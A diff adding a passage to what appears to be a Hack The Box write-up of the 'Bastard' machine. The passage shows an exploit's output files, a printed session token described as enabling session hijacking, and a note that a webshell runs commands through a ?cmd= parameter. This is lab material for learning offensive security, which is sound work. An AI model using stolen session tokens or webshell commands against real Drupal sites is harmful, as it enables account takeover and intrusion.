@@ -135,6 +135,31 @@ $file = [
 ];
 ```
 
+After the execution of the exploit, we are exported the following files:  
+
+```zsh
+╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4401]
+╰─[:)] # l
+total 292K
+drwxr-xr-x 4 root root 4.0K Apr 17 03:11 .
+drwxr-xr-x 8 root root 4.0K Apr 13 15:23 ..
+-rwxr-xr-x 1 root root 8.8K Apr 17 02:47 41564.php
+-rw-r--r-- 1 root root 1.1K Mar 30 04:48 Bastard.nmap
+-rw-r--r-- 1 root root  187 Apr 17 02:48 session.json
+-rw-r--r-- 1 root root  799 Apr 17 02:48 user.json
+```
+The **sessions.json** file will help us to perform Session Hijacking.  
+
+```zsh
+╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4404]
+╰─[:)] # cat session.json
+{
+    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
+    "session_id": "xya-3zwiiR560VcO0uua4q6bP_-Otc8mTV1C27s0ebk",
+    "token": "2dCM4IsWC26XnZkkofSjzmx1Dc6INTn3usnqNEb2fuI"
+} 
+```
+
 To run Remote Code Execution from our webshell we just need to add the parameter ?cmd= and the command we want to run.  
 
 ![RCE-Drupal](https://hackingprofessional.github.io/HTB/assets/img/posts/RCEBastard.png "RCE on Drupal") 
